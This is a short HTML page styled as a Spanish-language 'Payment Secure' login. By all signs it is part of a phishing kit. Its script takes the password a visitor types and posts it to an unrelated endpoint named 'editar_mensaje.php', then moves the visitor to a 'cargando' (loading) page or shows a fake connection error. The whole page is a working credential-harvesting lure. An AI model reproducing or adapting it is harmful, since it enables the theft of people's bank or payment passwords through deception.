<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Secure</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  		

</head>
<body>

<img src="img/logo.jpg" alt="" srcset="" width="100%">

<center><input type="password" id="txtPassword" placeholder="Ingresa tu contraseña" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:35px; height:40px; font-size:15px;" oninput="this.value = this.value.replace(/\s+/g, '')" required></center>
<a href="" style="position:absolute; right:30px; margin-top:10px;">¿Olvidaste tu contraseña?</a>

<center><input type="submit" id="btnPass" value="Continuar" style="width:80%; background-color:#e1406d; margin-top:50px; height:40px; border-radius:20px;"></center>
<center><input type="submit" value="Registrarme ahora" style="width:80%; color:#f08ba7; border:1px solid #f08ba7;margin-top:10px; height:40px; background-color:white; border-radius:20px;"></center>



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
	

		$('#btnPass').click(function(){
			if ($("#txtPassword").val().length > 3) {
				const data = {
                    'pass': $("#txtPassword").val()
                };
				 $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        console.log("Warning")
                    }
                });
			}else{
				$(".mensaje").show();
			}	
		});

				
	});

   

</script>
    
</body>
</html>